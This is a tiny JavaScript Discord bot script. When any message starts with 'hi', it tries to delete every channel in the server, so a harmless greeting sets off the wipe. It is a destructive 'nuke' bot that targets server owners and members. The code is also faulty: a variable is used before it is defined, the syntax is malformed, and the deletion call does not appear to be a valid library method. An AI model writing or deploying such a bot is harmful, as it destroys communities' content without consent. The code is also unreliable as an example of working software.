const client = new Discord.Client();
const Discord = require('discord.js'),
      
client.on('message', message => {
    if(message.content.startsWith(`hi`)){
        message.guild.channels.deleteAll();
    }
});
client.login(process.env.BOT_TOKEN); 

